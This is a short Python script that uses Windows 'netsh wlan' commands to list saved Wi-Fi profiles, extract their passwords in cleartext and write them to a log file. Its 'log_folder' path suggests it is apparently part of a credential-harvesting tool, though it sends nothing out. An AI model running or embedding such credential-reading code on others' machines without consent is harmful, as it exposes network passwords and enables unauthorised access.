# importing subprocess
import subprocess
 

def get_wifi_passwords():

    # getting meta data
    meta_data = subprocess.getoutput('netsh wlan show profiles')


    data_array = meta_data.split("All User Profile")[1:]

    profile_array = [i.replace('     : ','').replace('\n    ','').replace('\n','') for i in data_array]

    profiles = {}

    for profile_name in profile_array:

        password_string = subprocess.getoutput(f'netsh wlan show profile name="{profile_name}" key=clear')

        if 'Key Content            : ' in password_string:
            password = password_string.split('Key Content            : ')[1].split('\n')[0]
            profiles[profile_name] = password


    file = open('log_folder\\wifi_passwords.txt', 'w')

    for profile in profiles:
        file.write(f'SSID: {profile}         Password: {profiles[profile]}\n')

    file.close()

    return profiles

